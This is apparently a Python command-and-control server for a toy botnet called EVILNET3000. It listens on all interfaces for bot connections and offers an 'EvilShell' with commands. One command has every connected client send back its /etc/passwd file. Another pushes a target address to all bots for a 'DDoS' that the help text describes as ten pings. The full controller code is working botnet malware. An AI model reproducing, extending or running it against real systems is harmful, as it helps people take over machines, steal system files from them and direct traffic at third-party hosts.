import socket
import os
from _thread import *
from time import sleep
import signal

PORT = 3000
HOST = '0.0.0.0'  ## CHANGE THIS TO 127.0.0.1 FOR LOCALHOST TESTING
botnet_connections = set()

class color:
    # defines the colors on the console, taken from blender:
    # https://svn.blender.org/svnroot/bf-blender/trunk/blender/build_files/scons/tools/bcolors.py
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'


def print_intro():
    print("")
    print(" ███████╗██╗   ██╗██╗██╗     ███╗   ██╗███████╗████████╗██████╗  ██████╗  ██████╗  ██████╗ ")
    print(" ██╔════╝██║   ██║██║██║     ████╗  ██║██╔════╝╚══██╔══╝╚════██╗██╔═████╗██╔═████╗██╔═████╗")
    print(" █████╗  ██║   ██║██║██║     ██╔██╗ ██║█████╗     ██║    █████╔╝██║██╔██║██║██╔██║██║██╔██║")
    print(" ██╔══╝  ╚██╗ ██╔╝██║██║     ██║╚██╗██║██╔══╝     ██║    ╚═══██╗████╔╝██║████╔╝██║████╔╝██║")
    print(" ███████╗ ╚████╔╝ ██║███████╗██║ ╚████║███████╗   ██║   ██████╔╝╚██████╔╝╚██████╔╝╚██████╔╝")
    print(" ╚══════╝  ╚═══╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═════╝  ╚═════╝  ╚═════╝  ╚═════╝  v.0.1")
    print(" ")
    print(" A simple botnet proof of concept built by Jorge Martinez | nothing4free")


def print_help():
    print("     EVILNET3000: a simple botnet proof of concept built by Jorge Martinez | nothing4free")
    print("       > help: displays this menu.")

    print("     Evil stuff:")
    print("       > ddostoolkit: simulates a DDoS attack (only pings the specified host 10 times).")
    print("       > getpasswd: dumps the content of /etc/passwd from every client.")

    print("     Connection utilities:")
    print("       > connect: listens to and accepts incoming connections.")
    print("       > listcon: lists all active connections (UNDER DEV).")
    print("       > exit: closes all connections and exits the EvilShell.")

def threaded_client(conn):
    botnet_connections.add(conn)


def listen_for_connections():
    global ThreadCount
    ThreadCount = 0
    print(" [" + color.OKBLUE + "i" + color.ENDC + "] Listening for incoming connections...")
    Client, address = s.accept()
    print(" [" + color.OKGREEN + "i" + color.ENDC + "] New connection: " + address[0] + ":" + str(address[1]))
    start_new_thread(threaded_client, (Client,))
    ThreadCount += 1
    return


def close_connections():
    print(" [" + color.OKBLUE + "i" + color.ENDC + "] Shutting down the server")
    for conn in botnet_connections:
        conn.send(str.encode("!EXIT"))
        conn.close()


def list_connections():
    print(" [" + color.OKBLUE + "i" + color.ENDC + "] Showing active connections: ")
    i = 1
    for conn in botnet_connections:
        print("     Connection ", i, ": " + conn[0], ":", conn[1])
        i = i + 1
# SCRIPT STARTS HERE ---------------------------------------------------------------------------------------------------

print_intro()

try:
    s = socket.socket()
    print(" [" + color.OKBLUE + "i" + color.ENDC + "] Socket created.")

    s.bind((HOST, PORT))
    print(" [" + color.OKBLUE + "i" + color.ENDC + "] Socket binded to port %s" % (PORT))

    print(" [" + color.OKGREEN + "i" + color.ENDC + "] Socket ready.")
    s.listen(5)

except:
    print(" [" + color.FAIL + "!" + color.ENDC + "] There was an error creating or binding the socket. Exiting...")
    exit(0)

while True:
    op = input(" [EvilShell] > ")

    if op == "connect":
        listen_for_connections()

    elif op == "getpasswd":
        for conn in botnet_connections:
            conn.send(str.encode("getpasswd"))
            data = conn.recv(2048)
            print(data.decode("utf-8"))
            sleep(0.7)

    elif op == "ddostoolkit":
        ddos_ip = input(" [DDoSToolkit] > IP / url: ")
        for conn in botnet_connections:
            conn.send(str.encode("ddostoolkit"))
            sleep(0.7)
            conn.send(str.encode(ddos_ip))
            conn.recv(1024)

    elif op == "list connections":
        list_connections()

    elif op == "help":
        print_help()

    elif op == "exit":
        close_connections()
        break



# while True:
#     c, addr = s.accept()
#     print(" [" + color.OKBLUE + "i" + color.ENDC + "] Incoming connection from", addr[0], "on port", addr[1])
#     message = "Hello, this is the server talking to the client"
#     c.send(message.encode("utf-8"))
#     break;
#
# while True:
#     op = input(" EvilShell > ")
#     if op == "hello":
#         message = "1"
#         c.send(message.encode("utf-8"))
#     elif op == "goodbye":
#         message = "Goodbye!"
#         c.send(message.encode("utf-8"))
#     elif op == "close":
#         message = "Closing connection"
#         c.send(message.encode("utf-8"))
#         close_connection()
#         break;
